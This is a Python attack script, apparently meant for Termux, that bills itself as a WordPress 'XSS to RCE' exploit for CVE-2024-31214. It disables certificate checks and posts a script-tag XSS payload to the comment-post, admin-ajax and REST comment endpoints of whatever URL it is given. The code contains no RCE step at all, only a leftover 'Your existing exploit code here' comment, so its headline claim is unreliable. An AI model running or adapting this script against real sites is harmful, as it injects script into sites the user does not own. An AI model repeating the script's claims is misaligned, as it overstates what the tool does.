#!/usr/bin/env python3
"""
CVE-2024-31214 WordPress XSS to RCE Exploit
Modified for Termux
"""
import requests
import sys
import os
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def termux_banner():
    print("""
    ╔═══════════════════════════════════════╗
    ║      WordPress CVE-2024-31214 POC     ║
    ║           Termux Edition              ║
    ╚═══════════════════════════════════════╝
    """)

def check_target(target):
    """Check if target is accessible"""
    try:
        response = requests.get(target, timeout=10, verify=False)
        if 'wordpress' in response.text.lower() or response.status_code == 200:
            return True
    except:
        pass
    return False

def exploit_wordpress(target):
    """Main exploitation function"""
    
    # Your existing exploit code here
    xss_payload = '<script>alert("XSS-Test")</script>'
    
    # Test endpoints
    endpoints = [
        f"{target}/wp-comments-post.php",
        f"{target}/wp-admin/admin-ajax.php",
        f"{target}/wp-json/wp/v2/comments"
    ]
    
    for endpoint in endpoints:
        try:
            test_data = {
                'comment': xss_payload,
                'author': 'termux_test',
                'email': 'test@termux.com',
                'url': 'http://termux.org'
            }
            
            response = requests.post(endpoint, data=test_data, verify=False, timeout=10)
            
            if response.status_code == 200:
                print(f"[+] Payload sent to {endpoint}")
                print(f"[+] Response code: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Error with {endpoint}: {str(e)}")

def main():
    termux_banner()
    
    if len(sys.argv) != 2:
        print("Usage: python cve-2024-31214.py http://target-wordpress-site")
        print("Example: python cve-2024-31214.py http://localhost:8080")
        sys.exit(1)
    
    target = sys.argv[1]
    
    print(f"[*] Target: {target}")
    print("[*] Checking if target is accessible...")
    
    if check_target(target):
        print("[+] Target is accessible")
        print("[*] Starting exploitation...")
        exploit_wordpress(target)
    else:
        print("[-] Target is not accessible or not WordPress")
        print("[-] Check the URL and try again")

if __name__ == "__main__":
    main()
